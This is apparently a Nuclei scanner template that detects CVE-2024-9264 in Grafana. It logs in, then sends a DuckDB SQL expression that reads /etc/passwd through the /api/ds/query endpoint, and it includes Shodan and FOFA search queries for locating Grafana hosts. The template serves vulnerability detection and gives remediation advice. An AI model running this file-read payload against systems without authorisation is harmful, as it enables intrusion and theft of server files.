flow: http(1) && http(2)
http:
- matchers:
  - internal: true
    part: header
    type: word
    words:
    - grafana_session
  matchers-condition: and
  raw:
  - 'POST /login HTTP/1.1

    Host: {{Hostname}}

    Accept: application/json, text/plain, */*

    Accept-Language: en-US,en;q=0.5

    Referer: {{BaseURL}}

    content-type: application/json


    {"user":"{{username}}","password":"{{password}}"}

    '
- matchers:
  - part: body
    type: word
    words:
    - 'root:'
  - part: body
    type: word
    words:
    - '"data":{'
  matchers-condition: and
  raw:
  - "POST /api/ds/query?ds_type=__expr__&expression=true&requestId=Q101 HTTP/1.1\n\
    Host: {{Hostname}}\nContent-Type: application/json\n\n{\n  \"from\": \"1729313027261\"\
    ,\n  \"queries\": [\n    {\n      \"datasource\": {\n        \"name\": \"Expression\"\
    ,\n        \"type\": \"__expr__\",\n        \"uid\": \"__expr__\"\n      },\n\
    \      \"expression\": \"SELECT content FROM read_blob('/etc/passwd')\",\n   \
    \   \"hide\": false,\n      \"refId\": \"B\",\n      \"type\": \"sql\",\n    \
    \  \"window\": \"\"\n    }\n  ],\n  \"to\": \"1729334627261\"\n}\n"
id: CVE-2024-9264
info:
  author: princechaddha
  classification:
    cve-id: CVE-2024-9264
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.9
    cwe-id: CWE-94
    epss-percentile: 0.09691
    epss-score: 0.00043
  description: The SQL Expressions experimental feature of Grafana allows for the
    evaluation of `duckdb` queries containing user input. These queries are insufficiently
    sanitized before being passed to `duckdb`, leading to a command injection and
    local file inclusion vulnerability. Any user with the VIEWER or higher permission
    is capable of executing this attack. The `duckdb` binary must be present in Grafana's
    $PATH for this attack to function; by default, this binary is not installed in
    Grafana distributions.
  metadata:
    fofa-query:
    - app="grafana"
    - title="grafana"
    google-query: intitle:"grafana"
    max-request: 2
    product: grafana
    shodan-query:
    - http.title:"grafana"
    - cpe:"cpe:2.3:a:grafana:grafana"
    vendor: grafana
  name: Grafana Post-Auth DuckDB - SQL Injection (File Read)
  reference:
  - https://x.com/nol_tech/status/1847639874909749443
  - https://nvd.nist.gov/vuln/detail/CVE-2024-9264
  - https://grafana.com/security/security-advisories/cve-2024-9264/
  - https://github.com/fkie-cad/nvd-json-data-feeds
  - https://github.com/nomi-sec/PoC-in-GitHub
  remediation: 'Apply the vendor-supplied patch or upgrade to a non-vulnerable version.

    '
  severity: critical
  tags: cve,cve2024,grafana,authenticated
